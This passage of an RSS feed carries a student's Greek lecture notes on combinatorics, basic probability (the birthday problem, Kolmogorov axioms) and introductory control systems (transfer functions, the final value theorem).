να συμφέρει η ανάλυση τους με κάποιον από τους <i>εύκολους</i> τρόπους που είδαμε
μέχρι στιγμής. Καθώς τα νούμερα αυξάνονται είναι παράλογο να παραμείνουμε σε
τόσο <i>χειρωνακτικές λύσεις</i>.
</p>
</div>
<div id="outline-container-orgf3f8bf8" class="outline-3">
<h3 id="orgf3f8bf8"><span class="section-number-3">5.1.</span> <a href="#orgf3f8bf8">Θεώρημα πολλαπλασιαστικού κανόνα για γεγονότα</a></h3>
<div class="outline-text-3" id="text-5-1">
<p>
<i>Είναι ακόμα πιο εύκολο κατανοητό με την λογική παρά μέσα από την έκφραση</i>
Εχουμε ένα πρώτο πείραμα με \(n_1\) δυνατά αποτελέσματα, και για κάθε ένα από τα
αποτελέσματα του πρώτου πειράματος έχουμε \(n_2\) δυνατά αποτελέσματα του δεύτερου
πειράματος κτλ, και για κάθε ένα από τα αποτελέσματα του \(k − 1\) πειράματος έχουμε
nk δυνατά αποτελέσματα του τελευταίου \(k\) πειράματος, τότε όλα τα δυνατά
αποτελέσματα από όλα τα πειράματα είναι \(n1 · n2 · · · nk\)
</p>
</div>
<div id="outline-container-org0efd4e3" class="outline-4">
<h4 id="org0efd4e3"><span class="section-number-4">5.1.1.</span> <a href="#org0efd4e3">Παραδείγματα και χρήσεις</a></h4>
<div class="outline-text-4" id="text-5-1-1">
<ol class="org-ol">
<li><p>
Με πόσους τρόπους μπορούν να εκλεγούν ο πρόεδρος και ο αντιπρόεδρος σε έναν σύλλογο 25 ατόμων; \(25*24\)
</p>

<p>
<i>Επεξήγηση:</i> Έχουμε μια περίπτωση στην οποία μας ενδιαφέρει η διάταξη (
δηλαδή έχει διαφορά το ποιος θα βγει πρόεδρος και ποιος αντιπρόεδρος -
γίνεται να βγουν τα ίδια άτομα αλλά με διαφορετική διάταξη μα είναι και πάλι
έγκυρο γεγονός ). Έχουμε 25 άτομα που μπορούν να βγούν πρόεδρος, όμως με το
που βγαίνει κάποιο από αυτά πρόεδρος μόνο 24 μένουν για να καλύψουν την θέση
του αντιπροέδρου. Δεν γίνεται να είναι κανείς και τα δύο (<i>κοιτάζει παράξενα
στα απολυταρχικά καθεστώτα</i><sup><a id="fnr.1" class="footref" href="#fn.1" role="doc-backlink">1</a></sup>)
</p></li>

<li>́Ενα τεστ αποτελείται από 12 ερωτήσεις σωστού - λάθους. Με πόσους
διαφορετικούς τρόπους μπορεί να απαντήσει ο φοιτητής; \(2^{12}\)<sup><a id="fnr.2" class="footref" href="#fn.2" role="doc-backlink">2</a></sup></li>
</ol>
</div>
</div>
</div>
<div id="outline-container-org4acbfba" class="outline-3">
<h3 id="org4acbfba"><span class="section-number-3">5.2.</span> <a href="#org4acbfba">Θεώρημα για τον αριθμό αντιμεταθέσεων \(k\) απο \(n\) στοιχείων</a></h3>
<div class="outline-text-3" id="text-5-2">
<p>
<i>Αντιμετάθεση, γνωστή στους περισσότερους από τον αγγλικό όρο: permutation</i>
</p>

<p>
Το πλήθος των αντιμεταθέσεων \(k\) στοιχείων από ένα σύνολο \(n\) στοιχείων είναι:
</p>
\begin{equation}
_np_k= n(n-1)(n-2)\cdots(n-k+1) = \frac{n!}{(n-k)!}
\end{equation}
</div>
</div>
<div id="outline-container-org88223d5" class="outline-3">
<h3 id="org88223d5"><span class="section-number-3">5.3.</span> <a href="#org88223d5">Θεώρημα για τον αριθμό συνδυασμών \(k\) εκ \(n\) στοιχείων</a></h3>
<div class="outline-text-3" id="text-5-3">
\begin{equation}
_nc_k = \binom{n}{k} = \frac{n!}{k!(n-k)!}
\end{equation}
</div>
<div id="outline-container-org405dc87" class="outline-4">
<h4 id="org405dc87"><span class="section-number-4">5.3.1.</span> <a href="#org405dc87">Παρατήρηση</a></h4>
<div class="outline-text-4" id="text-5-3-1">
<p>
Από τον παραπάνω τύπο πολύ εύκολα προκύπτει πως:
</p>
\begin{equation}
\binom{n}{k}=\binom{n}{n-k}
\end{equation}
</div>
</div>
</div>
</div>
<div id="footnotes">
<h2 class="footnotes">Footnotes: </h2>
<div id="text-footnotes">

<div class="footdef"><sup><a id="fn.1" class="footnum" href="#fnr.1" role="doc-backlink">1</a></sup> <div class="footpara" role="doc-footnote"><p class="footpara">
I&rsquo;m sorry
</p></div></div>

<div class="footdef"><sup><a id="fn.2" class="footnum" href="#fnr.2" role="doc-backlink">2</a></sup> <div class="footpara" role="doc-footnote"><p class="footpara">
Η παιδιαστική εξήγηση του Σέρλοκ ταιριάζει γάντι και εδώ.
</p></div></div>


</div>
</div>]]>
</description></item>
<item>
<title>Βασικά θεωρήματα και αξιώματα πιθανοτήτων</title>
<link>posts/lectures/auth/pts/lec_PTS_2_20220315_lec2.html</link>
<pubDate>Fri, 11 Mar 2022 00:00:00 +0200</pubDate>
<guid>posts/lectures/auth/pts/lec_PTS_2_20220315_lec2.html</guid>
<description>
<![CDATA[<div id="outline-container-org6cf2196" class="outline-2">
<h2 id="org6cf2196"><span class="section-number-2">1.</span> <a href="#org6cf2196">Ανακεφαλαίωση: Μαθηματικοί τύποι δειγματοληψίας</a></h2>
<div class="outline-text-2" id="text-1">
<p>
Στις παρουσιάσεις του μαθήματος φαίνονται οι συγκεκριμένοι τύποι,
χαρακτηριζόμενοι από το αν η σειρά έχει σημασία και από το κατα πόσο είναι
<i>αποδεκτή</i> η επανεμφάνιση κάποιου στοιχείου. Ας τους δούμε περισσότερο
</p>
\begin{align}
n^k\\
\binom{n}{k}\\
\frac{n!}{(n-k)!k!}\\
\binom{n+k-1}{k}
\end{align}

<p>
Έστω ότι έχουμε 4 κάρτες ( ξεχωριστές ) και θέλουμε να δούμε με πόσους
διαφορετικούς τρόπους μπορούμε να τις μοιράσουμε ( αν δεν ενδιαφερόμαστε για την
σειρά τους)
</p>
</div>
<div id="outline-container-org48aeca8" class="outline-4">
<h4 id="org48aeca8"><span class="section-number-4">1.0.1.</span> <a href="#org48aeca8">Κάθε τρόπο που μπορούμε να τις μοιράσουμε:</a></h4>
<div class="outline-text-4" id="text-1-0-1">
<p>
Αυτό θα ήταν το δυναμοσύνολο που συναντήσαμε στην προηγούμενη διάλεξη άρα
\(2^n=2^4=16\) πιθανές διαφορετικές μορφές.
</p>

<p>
Εστιάζουμε όμως, για να φανεί η χρησιμότητα των παραπάνω τύπων, στις πιθανές
τριάδες που μπορούν να σχηματιστούν:
</p>
</div>
</div>
<div id="outline-container-orged56f6f" class="outline-4">
<h4 id="orged56f6f"><span class="section-number-4">1.0.2.</span> <a href="#orged56f6f">Με διάταξη και επανάθεση</a></h4>
<div class="outline-text-4" id="text-1-0-2">
<p>
Αν στις τριάδες που θα φτιάξουμε μπορούμε να έχουμε την ίδια κάρτα σε δύο θέσεις
( μάλλον άστοχη η επιλογή του παραδείγματος, μα και πάλι ), οι πιθανοί
συνδυασμοί που μπορούν να προκύψουν είναι:
</p>
<table>


<colgroup>
<col  class="org-right">

<col  class="org-right">

<col  class="org-right">
</colgroup>
<tbody>
<tr>
<td class="org-right">1</td>
<td class="org-right">1</td>
<td class="org-right">1</td>
</tr>

<tr>
<td class="org-right">1</td>
<td class="org-right">1</td>
<td class="org-right">2</td>
</tr>

<tr>
<td class="org-right">1</td>
<td class="org-right">1</td>
<td class="org-right">3</td>
</tr>

<tr>
<td class="org-right">&#x2026;</td>
<td class="org-right">&#x2026;</td>
<td class="org-right">&#x2026;</td>
</tr>

<tr>
<td class="org-right">4</td>
<td class="org-right">4</td>
<td class="org-right">4</td>
</tr>
</tbody>
</table>

<p>
Το πλήθος των οποίων δίνεται από την:
</p>
\begin{equation}
n^k
\end{equation}
</div>
<ol class="org-ol">
<li><a id="org6011d87"></a><a href="#org6011d87">Παρατήρηση:</a><br>
<div class="outline-text-5" id="text-1-0-2-1">
<p>
Το συγκεκριμένο είναι εύκολο να <i>προκύψει</i> και από κάποιον που έχει έστω βασικές
γνώσεις προγραμματισμού και μέσω της πολυπλοκότητας nested loops, καθώς
υπολογίζεις <b>κάθε πιθανή μορφή</b> - brute-forcing.
</p>
</div>
</li>
</ol>
</div>
<div id="outline-container-org6fadbb1" class="outline-4">
<h4 id="org6fadbb1"><span class="section-number-4">1.0.3.</span> <a href="#org6fadbb1">Με διάταξη χωρίς επανάθεση</a></h4>
<div class="outline-text-4" id="text-1-0-3">
<p>
Αν όμως δεν μπορούμε να χρησιμοποιήσουμε μια κάρτα παραπάνω από μια φορές τότε
αλλάζει εντελώς ο τύπος. Αυτό είναι εύκολα κατανοητό. Στις \(n\) κάρτες, μπορούμε
να επιλέξουμε \(n\), ενώ αφαιρώντας μια, την επόμενη θέση μπορούν να πάρουν \(n-1\),
\(n-2\), &#x2026;, \(n-k+1\) κάρτες. Εξού και ο τύπος:
</p>
\begin{equation}
n(n-1)(n-2)(n-\cdots)(n-k+1)
\end{equation}
</div>
<ol class="org-ol">
<li><a id="org55bb81a"></a><a href="#org55bb81a">Παράδειγμα: Πρόεδρος, ταμίας γραμματέας</a><br>
<div class="outline-text-5" id="text-1-0-3-1">
<p>
Επιλέγω τον πρόεδρο και κατόπιν επιλέγω τα υπόλοιπα μέλη του συμβουλίου:
Είναι \(k = 3, n = 25\), όπου \(n\) ο υποτιθέμενος αριθμός των υποψηφίων:
</p>

<p>
Οι περιπτώσεις δίνονται από την:
</p>
\begin{equation}
25(25-1)(25-2) = 25\cdot 24 \cdot 23 = 13800
\end{equation}
</div>
</li>
</ol>
</div>
<div id="outline-container-org27aacd3" class="outline-4">
<h4 id="org27aacd3"><span class="section-number-4">1.0.4.</span> <a href="#org27aacd3">Χωρις διάταξη, με επανάθεση</a></h4>
<div class="outline-text-4" id="text-1-0-4">
<p>
Δεν το έχω ξεκαθαρίσει αρκετά στο μυαλό μου - με κάποιο παράδειγμα: Είναι απλά
ένας τύπος.
</p>
\begin{equation}
\binom{n+k-1}{k}
\end{equation}
</div>
<ol class="org-ol">
<li><a id="org0e216e5"></a><a href="#org0e216e5">Ισοδύναμη έκφραση</a><br>
<div class="outline-text-5" id="text-1-0-4-1">
<p>
Με πόσους τρόπους μπορούμε να βάλουμε \(k\) πανομοιότυπα στοιχεία σε \(n\) κουτία
</p>
</div>
</li>
</ol>
</div>
<div id="outline-container-org1125c29" class="outline-4">
<h4 id="org1125c29"><span class="section-number-4">1.0.5.</span> <a href="#org1125c29">Χωρίς διάταξη, χωρίς επανάθεση</a></h4>
<div class="outline-text-4" id="text-1-0-5">
<p>
Να χωρίσουμε τα \(n\) στοιχεία ανά \(k\) στοιχεία. Η σειρά δεν μας νοιάζει, μα
προφανώς, δεν μπορούμε να τα επαναχρησιμοποιήσουμε.
</p>
\begin{equation}
\binom{n}{k}
\end{equation}
</div>
<ol class="org-ol">
<li><a id="orgc1e6f4a"></a><a href="#orgc1e6f4a">Κάρτες και full house</a><br>
<div class="outline-text-5" id="text-1-0-5-1">
<p>
Θέλουμε να υπολογίσουμε τις πιθανότητες κάποιος να έχει full house.
</p>

<p>
Χωρίζουμε τις επιμέρους έννοιες:
</p>
<ul class="org-ul">
<li>Έστω αρχικά οι πιθανοί συνδυασμοί έτσι ώστε να καταλήξουμε με μια τριάδα εκ
των ίδιων φύλλων: \(\binom{4}{3}\)
Αυτό συμβαίνει γιατί για κάθε τύπο φύλλου ( άσσους, δυάρια, τριάρια κτλ )
θέλουμε όλους τους τρόπους <span class="underline">χωρίς επανάθεση</span> που μπορεί να υπάρξει τριάδα
Έτσι οι περιπτώσεις να αποκτήσουμε τριάδα δίνονταί από την</li>
</ul>
\begin{equation}
A = \text{triplet} = 13 * \binom{4}{3}
\end{equation}
<ul class="org-ul">
<li>Τώρα θέλουμε να υπολογίσουμε την πιθανότητα να έχουμε και δυάδα από κάποιο εκ
των υπολοιπόμενων φύλλων: \(( 13 - 1  = 12 )\)
Άρα το δεύτερο συμβάν που θέλουμε να λάβει χώρα είναι το \(B\), το οποίο δίνεται
<i>περιγράφεται</i> από την:</li>
</ul>
\begin{equation}
B = \text{pair} = 12 \binom{4}{2}
\end{equation}

<p>
Το επόμενο λογικό βήμα είναι να υπολογίσουμε τις πιθανότητες να συμβούν τα \(A,B\)
<b>ταυτόχρονα</b>, το οποίο είναι άλλωστε και το ζητούμενο:
</p>
\begin{align*}
\prod = \frac{A\times B}{\binom{52}{5}} = \frac{13\binom{4}{3}\times12\binom{4}{2}}{\binom{52}{5}}
\end{align*}
</div>
</li>
</ol>
</div>
<div id="outline-container-orgd715517" class="outline-3">
<h3 id="orgd715517"><span class="section-number-3">1.1.</span> <a href="#orgd715517">Ταυτότητες</a></h3>
<div class="outline-text-3" id="text-1-1">
\begin{align*}
\binom{n}{k} &= \binom{n}{n-k} = \frac{n!}{(n-k)!k!}\\
n\binom{n-1}{k-1} &= k\binom{n}{k} \\
\binom{m+n}{k} &= \sum_{j=0}^k\binom{m}{j}\binom{n}{k-j} &\text{Vandermonde}
\end{align*}
</div>
</div>
<div id="outline-container-orgca9dc21" class="outline-3">
<h3 id="orgca9dc21"><span class="section-number-3">1.2.</span> <a href="#orgca9dc21">Παραδείγματα</a></h3>
<div class="outline-text-3" id="text-1-2">
</div>
<div id="outline-container-org7b2703f" class="outline-4">
<h4 id="org7b2703f"><span class="section-number-4">1.2.1.</span> <a href="#org7b2703f">Ρίψεις νομίσματος ( Bose-Einstein )</a></h4>
<div class="outline-text-4" id="text-1-2-1">
<p>
Έστω ότι ρίχνουμε το ίδιο νόμισμα δύο φορές. Οπότε έχουμε \(A= \text{2 coin
flips}\).
</p>
<ul class="org-ul">
<li><p>
Ο τύπος \(n^k\) μας δίνει \(4\) καθώς έχουμε
</p>
<table>


<colgroup>
<col  class="org-left">

<col  class="org-left">
</colgroup>
<tbody>
<tr>
<td class="org-left">K</td>
<td class="org-left">K</td>
</tr>

<tr>
<td class="org-left">Γ</td>
<td class="org-left">Γ</td>
</tr>

<tr>
<td class="org-left">Κ</td>
<td class="org-left">Γ</td>
</tr>

<tr>
<td class="org-left">Γ</td>
<td class="org-left">Κ</td>
</tr>
</tbody>
</table></li>
<li>Όμως, αν δεν ξεχωρίζουμε μεταξύ των ΚΓ και ΓΚ, ο τύπος \(\binom{n+k-1}{k}\)
είναι προφανώς καλύτερος, αφού συμπυκνώνει εκείνες τις δύο πιθανότητες σε μία,
δίνοντας μας 3.</li>
</ul>
</div>
</div>
</div>
</div>
<div id="outline-container-orged43d75" class="outline-2">
<h2 id="orged43d75"><span class="section-number-2">2.</span> <a href="#orged43d75">Εννοια της πιθανότητας</a></h2>
<div class="outline-text-2" id="text-2">
<p>
Στην προηγούμενη ενότητα είδαμε την έννοια του δειγματοχώρου ( sample space ),
\(S\). Έστω τώρα ένα σύνολο γεγονότων (δειγματοσημείων) που θέλουμε να συμβούν
\(A\). Ορίζουμε την πιθανότητα να συμβεί το \(A\) ως το πηλίκο του πλήθους των
στοιχείων του \(A\) με το πλήθος δυνατών δειγματοσημείων.
</p>
\begin{equation}
P(A) = \frac{\text{number of desired sample points}}{\text{number of possible sample points}}
\end{equation}
</div>
<div id="outline-container-org420941e" class="outline-4">
<h4 id="org420941e"><span class="section-number-4">2.0.1.</span> <a href="#org420941e">Παράδειγμα:</a></h4>
<div class="outline-text-4" id="text-2-0-1">
<p>
Έστω σε μία μάντρα αυτοκινήτων 8 χαλασμένα αυτοκίνητα, στα 20 συνολικά.
Επιλέγονται τυχαία 4 για έλεγχο. Ποια είναι η πιθανότητα να επιλεγεί μόνο 1
ελαττωματικό:
Ορίζω ως \(A = \text{only one faulty car}\)
</p>
\begin{align*}
P(A) = \frac{\binom{8}{1}\binom{12}{3}}{\binom{20}{4}} = \cdots = \frac{220}{4845} =  0.0454 \approx 4.5%
\end{align*}

<p>
Πως το υπολογίσαμε:
</p>
<ol class="org-ol">
<li>Βρήκαμε το πλήθος των περιπτώσεων που μας έδιναν μόνο ένα χαλασμένο
αυτοκίνητο, χωρίζοντας το στην <i>συλλογή</i> από τα δύο ξεχωριστά υποσύνολα
αυτοκινήτων ( εκείνα που λειτουργούσαν και εκείνα που δεν λειτουργούσαν ).</li>
<li>Βρήκαμε το πλήθος όλων των περιπτώσεων επιλογής 4 αυτοκινήτων</li>
<li>Εφαρμόσαμε των τύπο της πιθανότητας</li>
</ol>
</div>
</div>
<div id="outline-container-orgf845d78" class="outline-3">
<h3 id="orgf845d78"><span class="section-number-3">2.1.</span> <a href="#orgf845d78">Πρόβλημα γενεθλίων</a></h3>
<div class="outline-text-3" id="text-2-1">
<p>
Επανερχόμαστε στο πρόβλημα των γενεθλίων που αναφέρθηκε και στις σημειώσεις της
πρώτης διάλεξης. Ποια είναι η πιθανότητα από τα \(n\) άτομα να υπάρχουν
τουλάχιστον 2 άτομα που να έχουν γενέθλια την ίδια μέρα.
</p>

<p>
Αρχικά, θα χρειαστεί να <i>επαναπροσδιορίσουμε</i> το πρόβλημα, θέτοντας μερικούς κανόνες:
</p>
<ol class="org-ol">
<li><i>Βγάζουμε</i> την 29η Φεβροθαρίου</li>
<li><i>Ανεξαρτησία γενεθλίων</i>
Τα γενέθλια όλων είναι ανεξάρτητα μεταξύ τους</li>
</ol>

<p>
\(A = \{ \text{2 out of K have birthday on the same day} \}\)
</p>

<p>
Είναι δύσκολο να προσεγγίσουμε το πρόβλημα ως προς το \(A\). Αντ&rsquo; αυτού μπορούμε
να το προσεγγίσουμε ως προς \(\bar{A}\) και κατόπιν να εφαρμόσουμε την \(1 = P(A) +
P(\bar{A})\):
</p>

<p>
Επομένως:
</p>
\begin{equation}
P(\bar{A}) = \frac{365\cdot364\cdots (366-k)}{365^k}
\end{equation}

<p>
Αναλύοντας λίγο περισσότερο αυτόν τον τύπο:
</p>
<ul class="org-ul">
<li>Αριθμητής:
Πλήθος υποσυνόλων \(k\) εκ των \(365\) στοιχείων, χωρίς επανάθεση, μα με διάταξη.
Η αλήθεια είναι πως δεν καταλαβαίνω γιατί χρησιμοποιήθηκε το συγκεκριμένο
παρόλο που από μαθηματικής άποψης βγάζει νόημα. Το <i>με διάταξη</i> με χαλάει.</li>
<li>Παρονομαστής:
Όλες οι πιθανές, με διάταξη και επανάθεση περιπτώσεις:</li>
</ul>

<p>
Καθώς, όπως άλλωστε αναφέρθηκε και προηγουμένως, \(P(A) = 1 - P(\bar{A})\) έχουμε:
</p>
\begin{equation}
P(A) =
\begin{cases}
50.7\% &k=23\\
97\% &k=50\\
99.99\% &k=100
\end{cases}
\end{equation}

<p>
Το οποίο δείχνει ότι ήδη για \(k \geq 23\) είναι πιο πιθανό να συμπίπτουν τα
γενέθλια μελών του κοινού από ότι το να μη συμβαίνει.
</p>
</div>
</div>
<div id="outline-container-orgaa17036" class="outline-3">
<h3 id="orgaa17036"><span class="section-number-3">2.2.</span> <a href="#orgaa17036">Αξιώματα πιθανότητας Kolmogorov για πεπερασμένο δειγματοχώρο</a></h3>
<div class="outline-text-3" id="text-2-2">
<p>
Ο χώρος πιθανοτήτων αποτελείται από τον δειγματοχώρο \(S\) και την συνάρτηση \(P: A
\subseteq S\), για την οποία ισχύουν τα παρακάτω:
</p>
<ol class="org-ol">
<li>\(0\leq P(A)\leq 1\)</li>
<li>\(P(S) = 1\)</li>
<li>Αν \(A,B\) ξένα μεταξύ τους: \(P(A\cup B) = P(A)+P(B)\)</li>
</ol>
</div>
</div>
<div id="outline-container-orga6ac91c" class="outline-3">
<h3 id="orga6ac91c"><span class="section-number-3">2.3.</span> <a href="#orga6ac91c">Βασικά θεωρήματα πιθανότητας</a></h3>
<div class="outline-text-3" id="text-2-3">
<ol class="org-ol">
<li>\(P(\emptyset)=0\)</li>
<li>\(P(A)=1-P(\bar{A})\)</li>
<li>\(A\subseteq B \Rightarrow P(A)\leq P(B)\)</li>
<li>\(P(B-A) = P(B) - P(A\cap B)\)</li>
<li>\(P(B\cup A) = P(A)+P(B) -P(A\cap B)\)</li>
</ol>
<p>
They have been added twice, one could think of it in the same way as
</p>
\begin{equation}
\cos{x} = \frac{e^{\jmath x}+e^{-\jmath x}}{2}
\end{equation}
</div>
</div>
</div>
]]>
</description></item>
<item>
<title>Διάλεξη 1: Εισαγωγική και σφάλματα</title>
<link>posts/lectures/auth/sae1/lec_SAE1_20221013.html</link>
<pubDate>Thu, 13 Oct 2022 00:00:00 +0300</pubDate>
<guid>posts/lectures/auth/sae1/lec_SAE1_20221013.html</guid>
<description>
<![CDATA[<div id="outline-container-org37c4aa4" class="outline-2">
<h2 id="org37c4aa4"><span class="section-number-2">1.</span> <a href="#org37c4aa4">Εισαγωγικά</a></h2>
<div class="outline-text-2" id="text-1">
<p>
<i>Ποιο είναι το αντικείμενο του μαθήματος?</i>
Ο καθορισμός της μεταβλητής που μας ενδιαφέρει βάση των μεταβλητών (εισόδων) του
συστήματος. Εκείνες (μεταβλητές εισόδου) χωρίζονται σε <b>μεταβλητές ελέγχου</b> και
μεταβλητές <i>θορύβου</i> (δεν είναι αυτή η έννοια που χρησιμοποιήθηκε, αλλά είναι
σημασιολογικά σωστή).
</p>

<p>
Ο στόχος είναι η ανάλυση συστημάτων. Μια γενική μεθοδολογία:
</p>
<ol class="org-ol">
<li>Βρίσκεις γενικότερη μαθηματική έκφραση, την αναλύεις βάση σήματος εισόδου
και εξόδου</li>
<li>Βγάζεις την μαθηματική έκφραση του ελεγκτή που θέλεις</li>
<li>Υλοποιείς τον ελεγκτή εντός του κυκλώματος.</li>
</ol>
</div>
<div id="outline-container-org84a2ed4" class="outline-3">
<h3 id="org84a2ed4"><span class="section-number-3">1.1.</span> <a href="#org84a2ed4">Βασικές έννοιες</a></h3>
<div class="outline-text-3" id="text-1-1">
</div>
<ol class="org-ol">
<li><a id="org053b9a5"></a><a href="#org053b9a5">Η <i>φύση</i> του προβλήματος</a><br>
<div class="outline-text-5" id="text-1-1-0-1">
<p>
Εξαρτάται από τον τύπο της εισόδου: αν εκείνη είναι σταθερή, τότε λέμε πως
έχουμε <b>πρόβλημα ελέγχου ρύθμισης</b>. Αλλιώς, αν εκείνη μεταβάλλεται συναρτήσει
κάποιας παραμέτρου (έστω του χρόνου) λέμε πως έχουμε
<b>πρόβλημα ελέγχου παρακολούθησης</b>, και την παράμετρο την λέμε και <i>τροχιά</i>
</p>
</div>
</li>
<li><a id="orgc0b4684"></a><a href="#orgc0b4684">Συστήματα <b>κλειστού δρόμου</b>:</a><br>
<div class="outline-text-5" id="text-1-1-0-2">

<div id="org7a7ed4a" class="figure">
<p><img src="posts/lectures/auth/sae1/course_sae1_images/sae1_lec1_broxgxoi.png" alt="sae1_lec1_broxgxoi.png">
</p>
</div>
</div>
</li>
<li><a id="orgea22231"></a><a href="#orgea22231"><b>Είσοδος αναφοράς</b>: καθορίζει το τί θέλουμε να κάνει η έξοδος</a><br></li>

<li><a id="orgd1ab992"></a><a href="#orgd1ab992">Συνάρτηση μεταφοράς</a><br>
<div class="outline-text-5" id="text-1-1-0-4">
<p>
Συνάρτηση μεταφοράς του συστήματος (ως προς <b>μία</b> μεταβλητή εισόδου) ονομάζουμε
την συνάρτηση - πηλίκο του μετασχηματισμού Laplace της εξόδου προς τον
μετασχηματισμό Laplace της εισόδου:
</p>
\begin{equation}
\label{eq:16}
\frac{Y(s)}{R(s)} = 
\frac{\mathcal{L}[y]}{\mathcal{L}[r]}
\end{equation}
</div>
</li>
</ol>
<div id="outline-container-org5dacf86" class="outline-4">
<h4 id="org5dacf86"><span class="section-number-4">1.1.1.</span> <a href="#org5dacf86"><i>Επανάληψη</i> Μόνιμη κατάσταση</a></h4>
<div class="outline-text-4" id="text-1-1-1">
</div>
<ol class="org-ol">
<li><a id="orgb1fd597"></a><a href="#orgb1fd597">Μαθηματικά:</a><br>
<div class="outline-text-6" id="text-1-1-1-0-1">
<p>
Η έξοδος του συστήματος όταν ο χρόνος τείνει στο άπειρο ( εφόσον το όριο
υπάρχει. Αν δεν υπάρχει (ασταθές σύστημα) δεν έχουμε μόνιμη κατάσταση )
</p>
</div>
</li>
<li><a id="org413cf88"></a><a href="#org413cf88">Πρακτικά</a><br>
<div class="outline-text-6" id="text-1-1-1-0-2">
<p>
Όταν ουσιαστικά έχει εξασθενήσει η επιρροή οποιασδήποτε απρόσμενης μεταβολής.
</p>
</div>
</li>
</ol>
<li><a id="org3afa0d7"></a><a href="#org3afa0d7">Θεώρημα Τελικής Τιμής</a><br>
<div class="outline-text-5" id="text-1-1-1-1">
<p>
Μας λεει αυτό ( χρήση Laplace )
</p>
\begin{equation}
\label{eq:14}
\lim_{t\to \infty}f(t) \Rightarrow \lim_{s\to 0} sf(s)
\end{equation}
</div>
</li>
</ol>
</div>
<div id="outline-container-org28ed071" class="outline-4">
<h4 id="org28ed071"><span class="section-number-4">1.1.2.</span> <a href="#org28ed071">Προδιαγραφές λειτουργίας</a></h4>
<div class="outline-text-4" id="text-1-1-2">
<p>
Ουσιαστικά θα αναλύσουμε αυτά στην διάρκεια του εξαμήνου. Θα εξεταστούν πρωτα
τα 1-3 και μετα κάποια στιγμή θα περάσουμε στο 4.
</p>

<ol class="org-ol">
<li>Ακρίβεια στην μόνιμη κατάσταση</li>
<li>Ταχύτητα απόκρισης</li>
<li>Ευστάθεια και σχετική ευστάθεια.</li>
<li>Απόσβεση διαταραχών του θορύβου.</li>
</ol>
</div>
<ol class="org-ol">
<li><a id="org145aedf"></a><a href="#org145aedf">Κλασσικές συναρτήσεις εισόδου(?):</a><br>
<div class="outline-text-5" id="text-1-1-2-1">
<p>
Επισημάνθηκε και η σημασία <b>γρήγορης</b> αναγνώρισης των μετατροπών Laplace των
παρακάτω συναρτήσεων:
</p>
<ol class="org-ol">
<li>βηματική</li>
</ol>

\begin{equation}
\label{eq:17}
u(t) =
\begin{cases}
0, & t<0\\
1, & t\geq0
\end{cases}
\end{equation}
<ol class="org-ol">
<li>Ράμπας</li>
</ol>
\begin{equation}
\label{eq:18}
r(t) =
\begin{cases}
0, &t<0\\
t, &t\geq0
\end{cases}
\end{equation}
<ol class="org-ol">
<li>παραβολής</li>
</ol>
\begin{equation}
\label{eq:19}
f(t) = t^{2n}, n\in{\mathbb N}
\end{equation}
<ol class="org-ol">
<li>συνάρτηση \(\delta\)</li>
<li>ημιτονοειδής συναρτήσεις</li>
</ol>
</div>
</li>
</ol>
</div>
</div>
</div>
<div id="outline-container-orgdcc4308" class="outline-2">
<h2 id="orgdcc4308"><span class="section-number-2">2.</span> <a href="#orgdcc4308">Παράδειγμα Σταμούλη</a></h2>
<div class="outline-text-2" id="text-2">
<p>
Επίδειξη απλού συστήματος. Κινητήρας, ελεγκτής και εμφάνιση τελικής λειτουργίας
στην οθόνη  μέσω παλμογράφου.
</p>

<ul class="org-ul">
<li>Τιμή ποτενσιομέτρου (τάσης στα άκρα αυτού) ως ένδειξη θέσης (γωνίας-φάσης)
περιστρεφόμενης εξόδου.
<ul class="org-ul">
<li><p>
Η έξοδος στον παλμογράφο φαίνεται παράξενη: είναι σαν να λέμε <i>τριγωνική</i>
Πέφτει απότομα λόγω της φύσεως του ποτενσιομέτρου καθώς από την πλήρως
θετική τιμή ( ή θεωρητικά πλήρως αρνητική τιμή αν εφαρμοστεί αντίθετη τάση
στα άκρα του ) πάει στην ακραία αρνητική τιμή ( ή ακραία θετική (θεωρητικά) αντίστοιχα).
</p>


<div id="org4b52522" class="figure">
<p><img src="posts/lectures/auth/sae1/course_sae1_images/sae1_lec1_potensiometro-grafiki.png" alt="sae1_lec1_potensiometro-grafiki.png">
</p>
</div></li>
</ul></li>
</ul>
</div>
<div id="outline-container-orgf2197f6" class="outline-3">
<h3 id="orgf2197f6"><span class="section-number-3">2.1.</span> <a href="#orgf2197f6">Επίδραση κέρδους ενισχυτή</a></h3>
<div class="outline-text-3" id="text-2-1">
<p>
<b>Το κέρδος ενίσχυσης του ελεγκτή επηρεάζει <i>σημαντικά</i> την μορφή της εξόδου του
συστήματος</b>. Αν και μειώνει τον χρόνο αποκατάστασης (δηλαδή κατα την μεταβολή της
εισόδου μειώνει τον χρόνο που χρειάζεται η έξοδος να πιάσει την επιθυμητή τιμή),
εισάγει ταλάντωση ( το σύστημα περνάει εκείνη την τιμή και ταλαντώνεται μέχρι να
μείνει σε εκείνη ).
</p>


<div id="orgc080e26" class="figure">
<p><img src="posts/lectures/auth/sae1/course_sae1_images/sae1_lec1_epidrasikerdousenisxiti.png" alt="sae1_lec1_epidrasikerdousenisxiti.png">
</p>
</div>
</div>
</div>
</div>
<div id="outline-container-orgb7c3c75" class="outline-2">
<h2 id="orgb7c3c75"><span class="section-number-2">3.</span> <a href="#orgb7c3c75">Παράδειγμα Δουλγέρη στον πίνακα</a></h2>
<div class="outline-text-2" id="text-3">
<p>
Έχουμε το παρακάτω σύστημα:
<img src="posts/lectures/auth/sae1/course_sae1_images/sae1_lec1_paradeigmakyklwma.png" alt="sae1_lec1_paradeigmakyklwma.png">
</p>

<p>
Εύκολα προκύπτει πως περιγράφεται από τις:
</p>
\begin{align}
\label{eq:1}
\begin{cases}
r &= L \frac{di}{dt} + Ri + \frac{1}{C} \int i dt\\
y &= \frac{1}{C} \int i dt\\
\end{cases}
\end{align}

<p>
Έτσι έχουμε την συνάρτηση μεταφοράς:
</p>
\begin{equation}
\label{eq:2}
H(s) = \frac{Y(s)}{R(s)}
\end{equation}

<p>
Επομένως η αρχική μας εξίσωση γίνεται:
</p>
\begin{equation}
\label{eq:3}
U(s) = {\mathcal L}[u(t)] = Y(s)(s^2LC + s CR + 1)
\end{equation}
<p>
Συνδέοντας την είσοδο με την έξοδο σε μία πολύ απλή σχέση.
</p>
</div>
<div id="outline-container-org23a24b3" class="outline-3">
<h3 id="org23a24b3"><span class="section-number-3">3.1.</span> <a href="#org23a24b3">Unexpected</a></h3>
<div class="outline-text-3" id="text-3-1">
<p>
